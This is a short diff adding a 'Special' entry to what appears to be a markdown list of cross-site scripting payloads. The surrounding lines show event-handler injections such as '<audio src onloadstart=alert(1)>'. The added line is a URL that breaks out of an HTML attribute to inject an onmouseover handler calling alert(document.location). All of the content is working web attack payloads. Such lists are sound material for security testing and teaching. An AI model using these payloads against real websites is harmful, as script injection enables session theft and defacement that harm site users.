@@ -61,3 +61,9 @@
 <audio src onloadstart=alert(1)>
 <marquee onstart=alert(1)>
 ```
+
+## Special 
+
+```
+http://yassineaboukir.com/"onmouseover="alert(document.location)
+```
